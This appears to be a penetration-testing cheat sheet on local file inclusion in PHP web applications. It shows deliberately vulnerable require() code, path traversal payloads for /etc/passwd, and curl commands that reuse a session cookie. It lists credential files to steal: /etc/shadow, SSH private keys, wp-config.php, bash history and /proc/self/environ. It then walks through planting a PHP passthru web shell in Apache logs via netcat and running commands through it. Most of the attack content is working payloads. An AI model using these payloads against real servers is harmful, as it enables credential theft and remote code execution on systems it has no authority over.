# Local file inclusion

Local file inclusion means unauthorized access to filesystem.

With this we can get a hold of many sensitive files



In most web-services that use a database we can get a hold of the database username and password:


in wordpress the file is **wp-config.php**
And once you have gotten access to that you can do other things. Check out the chapter on mysql.


This is the definitive guide to Local File inclusion
https://highon.coffee/blog/lfi-cheat-sheet/

And this
http://securityidiots.com/Web-Pentest/LFI

And this:

https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/


The vulnerability stems from unsanitized user-input

Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter into the require-function without any sanitization. So the user can just add the path to any file.
```
# index.php
    <?php
      $file = $_GET['page'];
      require($file);
     ?>
```


## Linux

### Tricks

Check if a folder exists, go into it and the go out.

```
index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00"
```

**Download config-files in a nice style-format**
If you read files straight in the browser the styling can becomes unbearable. Really difficult to read. A way around it is to download the files from the terminal. But that won't work if there is a login that is blocking it. So this is a great workaround:

```
# First we save the cookie
curl -s http://example.com/login.php -c cookiefile -d "user=admin&pass=admin"
curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile
```


### Sensitive file

This is the default layout of important apache files.
https://wiki.apache.org/httpd/DistrosDefaultLayout

#### Web server files
```
# Usually found in the root of the website
.htaccess
config.php
```

#### SSH
```
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
```
#### Logs
```
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
```

#### General files

First you need to check the passwd file to find the users.
```
cat /etc/passwd
cat /etc/group
cat /etc/shadow
/var/mail/
```

#### User specific files

Found in the home-directory

```
.bash_history
.mysql_history
.my.cnf
```

#### Proc files

"Under Linux, /proc includes a directory for each running process, including kernel processes, in directories named /proc/PID, where PID is the process number. Each directory contains information about one process, including: /proc/PID/cmdline, the command that originally started the process."

https://en.wikipedia.org/wiki/Procfs

https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/
```
/proc/sched_debug # Can be used to see what processes the machine is running
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
```

## Bruteforcing SSH known_hosts

https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/


## LFI to shell

Under the right circumstances you might be able to get a shell from a LFI


### Log files
There are some requirements. We need to be able to read the apache2 log files, either the success.log or the error.log

So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.

1. Insert php-code into the log file.
This can be done with nc or telnet.

```
nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```

You can also add it to the error-log by making a request to a page that doesn't exists

```
nc 192.168.1.102 80
GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```


Or in the referer parameter.
```
GET / HTTP/1.1
Referer: <? passthru($_GET[cmd]) ?>
Host: 192.168.1.159
Connection: close
```

2. Execute it
In the browser:
```
http://192.168.1.102/index.php?/var/log/apache2/access.log&cmd=id
```

### /proc/self/environ

We can also inject code into /proc/self/environ through the user-agent

https://www.exploit-db.com/papers/12992/



https://www.youtube.com/watch?v=ttTVNcPnsJY